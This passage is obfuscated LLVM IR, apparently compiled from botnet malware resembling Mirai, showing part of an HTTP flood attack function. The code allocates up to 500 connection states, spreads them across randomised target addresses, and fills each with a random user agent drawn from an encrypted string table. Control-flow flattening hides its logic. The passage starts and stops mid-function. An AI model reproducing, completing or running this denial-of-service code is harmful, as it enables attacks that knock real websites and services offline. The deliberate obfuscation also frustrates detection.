    i32 1910821277, label %2688
    i32 -319556250, label %2689
    i32 1691909124, label %2690
    i32 1925317065, label %2691
    i32 -1395399066, label %2694
    i32 2022097974, label %2695
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8*, i8** %.reg2mem
  %85 = icmp eq i8* %.reload, null
  %86 = select i1 %85, i32 1337724025, i32 -1636316774
  store i32 %86, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i8*, i8** %17, align 8
  %89 = icmp eq i8* %88, null
  %90 = select i1 %89, i32 1337724025, i32 107130282
  store i32 %90, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  store i32 2022097974, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  %93 = load i8*, i8** %17, align 8
  %94 = call i32 @util_strlen(i8* %93)
  %95 = icmp sgt i32 %94, 255
  %96 = select i1 %95, i32 2005242974, i32 1915392948
  store i32 %96, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  store i32 2022097974, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load i8*, i8** %16, align 8
  %100 = call i32 @util_strlen(i8* %99)
  %101 = icmp sgt i32 %100, 127
  %102 = select i1 %101, i32 -553056408, i32 -227183040
  store i32 %102, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  store i32 2022097974, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = load i8*, i8** %15, align 8
  %106 = call i32 @util_strlen(i8* %105)
  %107 = icmp sgt i32 %106, 9
  %108 = select i1 %107, i32 1354153975, i32 -1973601913
  store i32 %108, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  store i32 2022097974, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  store i32 0, i32* %10, align 4
  store i32 -194587588, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %10, align 4
  %113 = load i8*, i8** %15, align 8
  %114 = call i32 @util_strlen(i8* %113)
  %115 = icmp slt i32 %112, %114
  %116 = select i1 %115, i32 -789928178, i32 1259437344
  store i32 %116, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i8*, i8** %15, align 8
  %119 = load i32, i32* %10, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8, i8* %118, i64 %120
  %122 = load i8, i8* %121, align 1
  %123 = sext i8 %122 to i32
  %124 = icmp sge i32 %123, 97
  %125 = select i1 %124, i32 -1092088789, i32 246952620
  store i32 %125, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = load i8*, i8** %15, align 8
  %128 = load i32, i32* %10, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i8, i8* %127, i64 %129
  %131 = load i8, i8* %130, align 1
  %132 = sext i8 %131 to i32
  %133 = icmp sle i32 %132, 122
  %134 = select i1 %133, i32 2073209544, i32 246952620
  store i32 %134, i32* %switchVar
  br label %loopEnd

; <label>:135:                                    ; preds = %loopEntry
  %136 = load i8*, i8** %15, align 8
  %137 = load i32, i32* %10, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds i8, i8* %136, i64 %138
  %140 = load i8, i8* %139, align 1
  %141 = sext i8 %140 to i32
  %142 = sub nsw i32 %141, 32
  %143 = trunc i32 %142 to i8
  store i8 %143, i8* %139, align 1
  store i32 246952620, i32* %switchVar
  br label %loopEnd

; <label>:144:                                    ; preds = %loopEntry
  store i32 584832372, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  %146 = load i32, i32* %10, align 4
  %147 = add nsw i32 %146, 1
  store i32 %147, i32* %10, align 4
  store i32 -194587588, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  %149 = load i32, i32* %18, align 4
  %150 = icmp sgt i32 %149, 500
  %151 = select i1 %150, i32 -1549048544, i32 -1126985416
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  store i32 500, i32* %18, align 4
  store i32 -1126985416, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 61)
  call void @table_unlock_val(i8 zeroext 62)
  call void @table_unlock_val(i8 zeroext 63)
  call void @table_unlock_val(i8 zeroext 64)
  call void @table_unlock_val(i8 zeroext 65)
  call void @table_unlock_val(i8 zeroext 66)
  call void @table_unlock_val(i8 zeroext 67)
  call void @table_unlock_val(i8 zeroext 68)
  call void @table_unlock_val(i8 zeroext 69)
  call void @table_unlock_val(i8 zeroext 70)
  call void @table_unlock_val(i8 zeroext 71)
  %154 = load i32, i32* %18, align 4
  %155 = sext i32 %154 to i64
  %156 = call noalias i8* @calloc(i64 %155, i64 3140) #6
  %157 = bitcast i8* %156 to %struct.attack_http_state*
  store %struct.attack_http_state* %157, %struct.attack_http_state** %13, align 8
  store i32 0, i32* %9, align 4
  store i32 719720770, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = load i32, i32* %9, align 4
  %160 = load i32, i32* %18, align 4
  %161 = icmp slt i32 %159, %160
  %162 = select i1 %161, i32 1797236555, i32 -1237009671
  store i32 %162, i32* %switchVar
  br label %loopEnd

; <label>:163:                                    ; preds = %loopEntry
  %164 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %165 = load i32, i32* %9, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %164, i64 %166
  %168 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %167, i32 0, i32 1
  store i8 0, i8* %168, align 4
  %169 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %170 = load i32, i32* %9, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %169, i64 %171
  %173 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %172, i32 0, i32 0
  store i32 -1, i32* %173, align 4
  %174 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %175 = load i32, i32* %9, align 4
  %176 = load i8, i8* %5, align 1
  %177 = zext i8 %176 to i32
  %178 = srem i32 %175, %177
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %174, i64 %179
  %181 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %180, i32 0, i32 1
  %182 = load i32, i32* %181, align 4
  %183 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %184 = load i32, i32* %9, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %183, i64 %185
  %187 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %186, i32 0, i32 4
  store i32 %182, i32* %187, align 4
  %188 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %189 = load i32, i32* %9, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %188, i64 %190
  %192 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %191, i32 0, i32 6
  %193 = getelementptr inbounds [257 x i8], [257 x i8]* %192, i32 0, i32 0
  %194 = load i8*, i8** %17, align 8
  %195 = call i32 @util_strcpy(i8* %193, i8* %194)
  %196 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %197 = load i32, i32* %9, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %196, i64 %198
  %200 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %199, i32 0, i32 6
  %201 = getelementptr inbounds [257 x i8], [257 x i8]* %200, i64 0, i64 0
  %202 = load i8, i8* %201, align 4
  %203 = sext i8 %202 to i32
  %204 = icmp ne i32 %203, 47
  %205 = select i1 %204, i32 608031593, i32 -1556637360
  store i32 %205, i32* %switchVar
  br label %loopEnd

; <label>:206:                                    ; preds = %loopEntry
  %207 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %208 = load i32, i32* %9, align 4
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %207, i64 %209
  %211 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %210, i32 0, i32 6
  %212 = getelementptr inbounds [257 x i8], [257 x i8]* %211, i32 0, i32 0
  %213 = getelementptr inbounds i8, i8* %212, i64 1
  %214 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %215 = load i32, i32* %9, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %214, i64 %216
  %218 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %217, i32 0, i32 6
  %219 = getelementptr inbounds [257 x i8], [257 x i8]* %218, i32 0, i32 0
  %220 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %221 = load i32, i32* %9, align 4
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %220, i64 %222
  %224 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %223, i32 0, i32 6
  %225 = getelementptr inbounds [257 x i8], [257 x i8]* %224, i32 0, i32 0
  %226 = call i32 @util_strlen(i8* %225)
  %227 = sext i32 %226 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %213, i8* %219, i64 %227, i32 1, i1 false)
  %228 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %229 = load i32, i32* %9, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %228, i64 %230
  %232 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %231, i32 0, i32 6
  %233 = getelementptr inbounds [257 x i8], [257 x i8]* %232, i64 0, i64 0
  store i8 47, i8* %233, align 4
  store i32 -1556637360, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  %235 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %236 = load i32, i32* %9, align 4
  %237 = sext i32 %236 to i64
  %238 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %235, i64 %237
  %239 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %238, i32 0, i32 10
  %240 = getelementptr inbounds [9 x i8], [9 x i8]* %239, i32 0, i32 0
  %241 = load i8*, i8** %15, align 8
  %242 = call i32 @util_strcpy(i8* %240, i8* %241)
  %243 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %244 = load i32, i32* %9, align 4
  %245 = sext i32 %244 to i64
  %246 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %243, i64 %245
  %247 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %246, i32 0, i32 9
  %248 = getelementptr inbounds [9 x i8], [9 x i8]* %247, i32 0, i32 0
  %249 = load i8*, i8** %15, align 8
  %250 = call i32 @util_strcpy(i8* %248, i8* %249)
  %251 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %252 = load i32, i32* %9, align 4
  %253 = sext i32 %252 to i64
  %254 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %251, i64 %253
  %255 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %254, i32 0, i32 7
  %256 = getelementptr inbounds [129 x i8], [129 x i8]* %255, i32 0, i32 0
  %257 = load i8*, i8** %16, align 8
  %258 = call i32 @util_strcpy(i8* %256, i8* %257)
  %259 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %260 = load i32, i32* %9, align 4
  %261 = load i8, i8* %5, align 1
  %262 = zext i8 %261 to i32
  %263 = srem i32 %260, %262
  %264 = sext i32 %263 to i64
  %265 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %259, i64 %264
  %266 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %265, i32 0, i32 2
  %267 = load i8, i8* %266, align 4
  %268 = zext i8 %267 to i32
  %269 = icmp slt i32 %268, 32
  %270 = select i1 %269, i32 811657583, i32 -413694779
  store i32 %270, i32* %switchVar
  br label %loopEnd

; <label>:271:                                    ; preds = %loopEntry
  %272 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %273 = load i32, i32* %9, align 4
  %274 = load i8, i8* %5, align 1
  %275 = zext i8 %274 to i32
  %276 = srem i32 %273, %275
  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %272, i64 %277
  %279 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %278, i32 0, i32 1
  %280 = load i32, i32* %279, align 4
  %281 = call i32 @ntohl(i32 %280) #7
  %282 = call i32 @rand_next()
  %283 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %284 = load i32, i32* %9, align 4
  %285 = load i8, i8* %5, align 1
  %286 = zext i8 %285 to i32
  %287 = srem i32 %284, %286
  %288 = sext i32 %287 to i64
  %289 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %283, i64 %288
  %290 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %289, i32 0, i32 2
  %291 = load i8, i8* %290, align 4
  %292 = zext i8 %291 to i32
  %293 = lshr i32 %282, %292
  %294 = add i32 %281, %293
  %295 = call i32 @htonl(i32 %294) #7
  %296 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %297 = load i32, i32* %9, align 4
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %296, i64 %298
  %300 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %299, i32 0, i32 4
  store i32 %295, i32* %300, align 4
  store i32 -413694779, i32* %switchVar
  br label %loopEnd

; <label>:301:                                    ; preds = %loopEntry
  %302 = call i32 @rand_next()
  %303 = urem i32 %302, 15
  store i32 %303, i32* %.reg2mem30
  store i32 1647334252, i32* %switchVar
  br label %loopEnd

NodeBlock27:                                      ; preds = %loopEntry
  %.reload46 = load volatile i32, i32* %.reg2mem30
  %Pivot28 = icmp slt i32 %.reload46, 7
  %304 = select i1 %Pivot28, i32 -780053360, i32 2107451100
  store i32 %304, i32* %switchVar
  br label %loopEnd

NodeBlock25:                                      ; preds = %loopEntry
  %.reload38 = load volatile i32, i32* %.reg2mem30
  %Pivot26 = icmp slt i32 %.reload38, 11
  %305 = select i1 %Pivot26, i32 -2184278, i32 1778965266
  store i32 %305, i32* %switchVar
  br label %loopEnd

NodeBlock23:                                      ; preds = %loopEntry
  %.reload34 = load volatile i32, i32* %.reg2mem30
  %Pivot24 = icmp slt i32 %.reload34, 13
  %306 = select i1 %Pivot24, i32 606958422, i32 1021026538
  store i32 %306, i32* %switchVar
  br label %loopEnd

NodeBlock21:                                      ; preds = %loopEntry
  %.reload32 = load volatile i32, i32* %.reg2mem30
  %Pivot22 = icmp slt i32 %.reload32, 14
  %307 = select i1 %Pivot22, i32 324649452, i32 -1726654699
  store i32 %307, i32* %switchVar
  br label %loopEnd

LeafBlock19:                                      ; preds = %loopEntry
  %.reload31 = load volatile i32, i32* %.reg2mem30
  %SwitchLeaf20 = icmp eq i32 %.reload31, 14
  %308 = select i1 %SwitchLeaf20, i32 1371440388, i32 1643807840
  store i32 %308, i32* %switchVar
  br label %loopEnd

NodeBlock17:                                      ; preds = %loopEntry
  %.reload33 = load volatile i32, i32* %.reg2mem30
  %Pivot18 = icmp slt i32 %.reload33, 12
  %309 = select i1 %Pivot18, i32 2053777021, i32 390947147
  store i32 %309, i32* %switchVar
  br label %loopEnd

NodeBlock15:                                      ; preds = %loopEntry
  %.reload37 = load volatile i32, i32* %.reg2mem30
  %Pivot16 = icmp slt i32 %.reload37, 9
  %310 = select i1 %Pivot16, i32 -590628979, i32 -1278374434
  store i32 %310, i32* %switchVar
  br label %loopEnd

NodeBlock13:                                      ; preds = %loopEntry
  %.reload35 = load volatile i32, i32* %.reg2mem30
  %Pivot14 = icmp slt i32 %.reload35, 10
  %311 = select i1 %Pivot14, i32 -1618308699, i32 1211537211
  store i32 %311, i32* %switchVar
  br label %loopEnd

NodeBlock11:                                      ; preds = %loopEntry
  %.reload36 = load volatile i32, i32* %.reg2mem30
  %Pivot12 = icmp slt i32 %.reload36, 8
  %312 = select i1 %Pivot12, i32 1980329069, i32 833301882
  store i32 %312, i32* %switchVar
  br label %loopEnd

NodeBlock9:                                       ; preds = %loopEntry
  %.reload45 = load volatile i32, i32* %.reg2mem30
  %Pivot10 = icmp slt i32 %.reload45, 3
  %313 = select i1 %Pivot10, i32 1111214287, i32 656950971
  store i32 %313, i32* %switchVar
  br label %loopEnd

NodeBlock7:                                       ; preds = %loopEntry
  %.reload41 = load volatile i32, i32* %.reg2mem30
  %Pivot8 = icmp slt i32 %.reload41, 5
  %314 = select i1 %Pivot8, i32 1221167287, i32 1512404082
  store i32 %314, i32* %switchVar
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload39 = load volatile i32, i32* %.reg2mem30
  %Pivot6 = icmp slt i32 %.reload39, 6
  %315 = select i1 %Pivot6, i32 -1447806190, i32 -506764894
  store i32 %315, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload40 = load volatile i32, i32* %.reg2mem30
  %Pivot4 = icmp slt i32 %.reload40, 4
  %316 = select i1 %Pivot4, i32 135530482, i32 945865597
  store i32 %316, i32* %switchVar
  br label %loopEnd

NodeBlock1:                                       ; preds = %loopEntry
  %.reload44 = load volatile i32, i32* %.reg2mem30
  %Pivot2 = icmp slt i32 %.reload44, 1
  %317 = select i1 %Pivot2, i32 2135276121, i32 1765876192
  store i32 %317, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload42 = load volatile i32, i32* %.reg2mem30
  %Pivot = icmp slt i32 %.reload42, 2
  %318 = select i1 %Pivot, i32 -411689865, i32 1514974574
  store i32 %318, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload43 = load volatile i32, i32* %.reg2mem30
  %SwitchLeaf = icmp eq i32 %.reload43, 0
  %319 = select i1 %SwitchLeaf, i32 663176085, i32 1643807840
  store i32 %319, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 72)
  %321 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %322 = load i32, i32* %9, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %321, i64 %323
  %325 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %324, i32 0, i32 5
  %326 = getelementptr inbounds [512 x i8], [512 x i8]* %325, i32 0, i32 0
  %327 = call i8* @table_retrieve_val(i32 72, i32* null)
  %328 = call i32 @util_strcpy(i8* %326, i8* %327)
  call void @table_lock_val(i8 zeroext 72)
  store i32 -1475051971, i32* %switchVar
  br label %loopEnd

; <label>:329:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 73)
  %330 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %331 = load i32, i32* %9, align 4
  %332 = sext i32 %331 to i64
  %333 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %330, i64 %332
  %334 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %333, i32 0, i32 5
  %335 = getelementptr inbounds [512 x i8], [512 x i8]* %334, i32 0, i32 0
  %336 = call i8* @table_retrieve_val(i32 73, i32* null)
  %337 = call i32 @util_strcpy(i8* %335, i8* %336)
  call void @table_lock_val(i8 zeroext 73)
  store i32 -1475051971, i32* %switchVar
  br label %loopEnd

; <label>:338:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 74)
  %339 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %340 = load i32, i32* %9, align 4
  %341 = sext i32 %340 to i64
  %342 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %339, i64 %341
  %343 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %342, i32 0, i32 5
  %344 = getelementptr inbounds [512 x i8], [512 x i8]* %343, i32 0, i32 0
  %345 = call i8* @table_retrieve_val(i32 74, i32* null)
  %346 = call i32 @util_strcpy(i8* %344, i8* %345)
  call void @table_lock_val(i8 zeroext 74)
  store i32 -1475051971, i32* %switchVar
  br label %loopEnd

; <label>:347:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 75)
  %348 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %349 = load i32, i32* %9, align 4
  %350 = sext i32 %349 to i64
  %351 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %348, i64 %350
  %352 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %351, i32 0, i32 5
  %353 = getelementptr inbounds [512 x i8], [512 x i8]* %352, i32 0, i32 0
  %354 = call i8* @table_retrieve_val(i32 75, i32* null)
  %355 = call i32 @util_strcpy(i8* %353, i8* %354)
  call void @table_lock_val(i8 zeroext 75)
  store i32 -1475051971, i32* %switchVar
  br label %loopEnd

; <label>:356:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 76)
  %357 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %358 = load i32, i32* %9, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %357, i64 %359
  %361 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %360, i32 0, i32 5
  %362 = getelementptr inbounds [512 x i8], [512 x i8]* %361, i32 0, i32 0
  %363 = call i8* @table_retrieve_val(i32 76, i32* null)
  %364 = call i32 @util_strcpy(i8* %362, i8* %363)
  call void @table_lock_val(i8 zeroext 76)
  store i32 -1475051971, i32* %switchVar
  br label %loopEnd

; <label>:365:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 77)
  %366 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %367 = load i32, i32* %9, align 4
  %368 = sext i32 %367 to i64
  %369 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %366, i64 %368
  %370 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %369, i32 0, i32 5
  %371 = getelementptr inbounds [512 x i8], [512 x i8]* %370, i32 0, i32 0
  %372 = call i8* @table_retrieve_val(i32 77, i32* null)
  %373 = call i32 @util_strcpy(i8* %371, i8* %372)
  call void @table_lock_val(i8 zeroext 77)
  store i32 -1475051971, i32* %switchVar
  br label %loopEnd

; <label>:374:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 78)
  %375 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %376 = load i32, i32* %9, align 4
  %377 = sext i32 %376 to i64
  %378 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %375, i64 %377
  %379 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %378, i32 0, i32 5
  %380 = getelementptr inbounds [512 x i8], [512 x i8]* %379, i32 0, i32 0
  %381 = call i8* @table_retrieve_val(i32 78, i32* null)
  %382 = call i32 @util_strcpy(i8* %380, i8* %381)
  call void @table_lock_val(i8 zeroext 78)
  store i32 -1475051971, i32* %switchVar
  br label %loopEnd

; <label>:383:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 79)
  %384 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %385 = load i32, i32* %9, align 4
  %386 = sext i32 %385 to i64
  %387 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %384, i64 %386
  %388 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %387, i32 0, i32 5
  %389 = getelementptr inbounds [512 x i8], [512 x i8]* %388, i32 0, i32 0
  %390 = call i8* @table_retrieve_val(i32 79, i32* null)
  %391 = call i32 @util_strcpy(i8* %389, i8* %390)
  call void @table_lock_val(i8 zeroext 79)
  store i32 -1475051971, i32* %switchVar
  br label %loopEnd

; <label>:392:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 80)
  %393 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %394 = load i32, i32* %9, align 4
  %395 = sext i32 %394 to i64
  %396 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %393, i64 %395
  %397 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %396, i32 0, i32 5
  %398 = getelementptr inbounds [512 x i8], [512 x i8]* %397, i32 0, i32 0
  %399 = call i8* @table_retrieve_val(i32 80, i32* null)
  %400 = call i32 @util_strcpy(i8* %398, i8* %399)
  call void @table_lock_val(i8 zeroext 80)
  store i32 -1475051971, i32* %switchVar
  br label %loopEnd

; <label>:401:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 81)
  %402 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %403 = load i32, i32* %9, align 4
  %404 = sext i32 %403 to i64
  %405 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %402, i64 %404
  %406 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %405, i32 0, i32 5
  %407 = getelementptr inbounds [512 x i8], [512 x i8]* %406, i32 0, i32 0
  %408 = call i8* @table_retrieve_val(i32 81, i32* null)
  %409 = call i32 @util_strcpy(i8* %407, i8* %408)
  call void @table_lock_val(i8 zeroext 81)
  store i32 -1475051971, i32* %switchVar
  br label %loopEnd

; <label>:410:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 82)
  %411 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %412 = load i32, i32* %9, align 4
  %413 = sext i32 %412 to i64
  %414 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %411, i64 %413
  %415 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %414, i32 0, i32 5
  %416 = getelementptr inbounds [512 x i8], [512 x i8]* %415, i32 0, i32 0
  %417 = call i8* @table_retrieve_val(i32 82, i32* null)
  %418 = call i32 @util_strcpy(i8* %416, i8* %417)
  call void @table_lock_val(i8 zeroext 82)
  store i32 -1475051971, i32* %switchVar
  br label %loopEnd

; <label>:419:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 83)
  %420 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %421 = load i32, i32* %9, align 4
  %422 = sext i32 %421 to i64
  %423 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %420, i64 %422
  %424 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %423, i32 0, i32 5
  %425 = getelementptr inbounds [512 x i8], [512 x i8]* %424, i32 0, i32 0
  %426 = call i8* @table_retrieve_val(i32 83, i32* null)
  %427 = call i32 @util_strcpy(i8* %425, i8* %426)
  call void @table_lock_val(i8 zeroext 83)
  store i32 -1475051971, i32* %switchVar
  br label %loopEnd

; <label>:428:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 84)
  %429 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %430 = load i32, i32* %9, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %429, i64 %431
  %433 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %432, i32 0, i32 5
  %434 = getelementptr inbounds [512 x i8], [512 x i8]* %433, i32 0, i32 0
  %435 = call i8* @table_retrieve_val(i32 84, i32* null)
  %436 = call i32 @util_strcpy(i8* %434, i8* %435)
  call void @table_lock_val(i8 zeroext 84)
  store i32 -1475051971, i32* %switchVar
  br label %loopEnd

; <label>:437:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 85)
  %438 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %439 = load i32, i32* %9, align 4
  %440 = sext i32 %439 to i64
  %441 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %438, i64 %440
  %442 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %441, i32 0, i32 5
  %443 = getelementptr inbounds [512 x i8], [512 x i8]* %442, i32 0, i32 0
  %444 = call i8* @table_retrieve_val(i32 85, i32* null)
  %445 = call i32 @util_strcpy(i8* %443, i8* %444)
  call void @table_lock_val(i8 zeroext 85)
  store i32 -1475051971, i32* %switchVar
  br label %loopEnd

; <label>:446:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 86)
  %447 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %448 = load i32, i32* %9, align 4
  %449 = sext i32 %448 to i64
  %450 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %447, i64 %449
  %451 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %450, i32 0, i32 5
  %452 = getelementptr inbounds [512 x i8], [512 x i8]* %451, i32 0, i32 0
  %453 = call i8* @table_retrieve_val(i32 86, i32* null)
  %454 = call i32 @util_strcpy(i8* %452, i8* %453)
  call void @table_lock_val(i8 zeroext 86)
  store i32 -1475051971, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 -1475051971, i32* %switchVar
  br label %loopEnd

; <label>:455:                                    ; preds = %loopEntry
  %456 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %457 = load i32, i32* %9, align 4
  %458 = sext i32 %457 to i64
